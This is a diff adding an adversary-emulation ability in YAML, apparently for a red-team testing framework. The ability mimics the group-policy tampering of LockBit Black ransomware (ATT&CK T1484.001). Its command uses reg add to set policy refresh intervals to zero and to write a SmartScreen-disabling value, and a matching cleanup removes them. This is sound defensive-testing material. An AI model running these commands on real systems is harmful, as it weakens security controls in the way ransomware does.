@@ -1,0 +1,28 @@
+---
+- id: e9345933cc8cb67dbc560f3c2066edd0
+  name: LockBit Black - Modify Group policy settings -cmd
+  description: 'An adversary can modify the group policy settings.
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1484.001
+    name: 'Domain Policy Modification: Group Policy Modification'
+  platforms:
+    windows:
+      cmd:
+        command: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeDC
+          /t REG_DWORD /d 0 /f && reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f && reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f && reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f && reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v EnableSmartScreen /t REG_DWORD /d 0 /f && reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v ShellSmartScreenLevel /t REG_SZ /d Block /f
+        payloads: []
+        cleanup: reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeDC
+          /f >nul 2>&1 && reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v GroupPolicyRefreshTimeOffsetDC /f >nul 2>&1 && reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v GroupPolicyRefreshTime /f >nul 2>&1 && reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v GroupPolicyRefreshTimeOffset /f >nul 2>&1 && reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v EnableSmartScreen /f >nul 2>&1 && reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System"
+          /v ShellSmartScreenLevel /f >nul 2>&1
